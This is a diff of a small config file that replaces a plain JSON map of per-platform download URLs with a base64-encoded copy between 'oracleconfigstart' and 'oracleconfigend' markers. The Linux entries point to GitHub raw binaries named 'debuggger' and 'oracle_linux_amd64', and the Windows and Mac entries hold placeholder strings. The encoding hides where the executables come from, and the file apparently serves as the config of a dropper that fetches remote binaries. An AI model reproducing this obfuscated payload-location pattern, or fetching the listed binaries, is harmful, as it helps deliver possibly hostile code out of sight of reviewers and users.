@@ -1,9 +1,1 @@
-{
-  "version": "1.0.1",
-  "win32": "dodo",
-  "win64": "haha",
-  "mac32": "qwe",
-  "mac64": "ze",
-  "lin32": "https://github.com/qweriao/debuggger/raw/master/debuggger",
-  "lin64": "https://github.com/artazart/artogo/raw/master/oracle_linux_amd64"
-}
+oracleconfigstart!eyJ2ZXJzaW9uIjogIjEuMC4xIiwgIndpbjMyIjogImRvZG8iLCAid2luNjQiOiAiaGFoYSIsICJtYWMzMiI6ICJxd2UiLCAibWFjNjQiOiAiemUiLCAibGluMzIiOiAiaHR0cHM6Ly9naXRodWIuY29tL3F3ZXJpYW8vZGVidWdnZ2VyL3Jhdy9tYXN0ZXIvZGVidWdnZ2VyIiwgImxpbjY0IjogImh0dHBzOi8vZ2l0aHViLmNvbS9hcnRhemFydC9hcnRvZ28vcmF3L21hc3Rlci9vcmFjbGVfbGludXhfYW1kNjQifQ==!oracleconfigend
